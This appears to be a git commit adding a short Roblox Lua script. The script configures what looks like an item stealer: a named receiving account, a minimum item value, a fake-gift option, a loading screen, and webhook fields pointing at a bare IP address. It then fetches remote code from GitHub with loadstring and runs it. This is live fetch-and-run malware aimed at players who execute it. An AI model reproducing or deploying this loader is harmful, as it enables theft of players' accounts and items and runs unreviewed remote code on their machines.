707652ed471d0f30e74668ec9630f24e14a4be51
youster166 <bekostop34@gmail.com>
2025-08-03 19:30:11 +0200

    Upload script.lua via Script Source Converter

---
+++ script.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"younex901"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/021b82a750787bcb68ca81a3f2203c56",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/021b82a750787bcb68ca81a3f2203c56",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
